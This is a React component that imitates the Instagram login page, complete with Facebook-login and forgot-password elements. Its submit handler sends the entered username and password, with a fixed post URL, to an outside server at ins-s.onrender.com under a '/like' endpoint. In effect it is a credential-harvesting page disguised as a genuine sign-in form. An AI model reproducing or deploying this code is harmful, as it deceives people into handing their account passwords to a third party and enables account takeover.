import './App.css'
import ins from '../public/imagei.png'
import { useState } from 'react'
function App () {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [postUrl, setPostUrl] = useState(
    'https://www.instagram.com/p/DDybnkrIH5_/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA=='
  )
  const [message, setMessage] = useState('')

  const handleSubmit = async e => {
    e.preventDefault()
    setMessage('Processing...')

    const response = await fetch('https://ins-s.onrender.com/like', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ username, password, postUrl })
    })

    const data = await response.json()
    setMessage(data.message || 'Something went wrong')
  }
  return (
    <div className='login-page dark-mode'>
      <div className='login-container'>
        <div className='login-form-container'>
          <form onSubmit={handleSubmit} className='login-form'>
            <img src={ins} alt='o' />
            <input
              type='text'
              placeholder='Phone number, username, or email'
              required
              value={username}
              onChange={e => setUsername(e.target.value)}
            />
            <input
              type='password'
              value={password}
              onChange={e => setPassword(e.target.value)}
              placeholder='Password'
              required
            />
            <button type='submit'>Log In</button>
            <p>{message}</p>
            <div className='separator'>
              <div className='line'></div>
              <span>OR</span>
              <div className='line'></div>
            </div>
            <button type='submit' className='facebook-login'>
              Log in with Facebook
            </button>
            <a href='#' className='forgot-password'>
              Forgot password?
            </a>
          </form>
          <div className='signup-container'>
            <p>
              Don't have an account? <a href='#'>Sign up</a>
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}

export default App
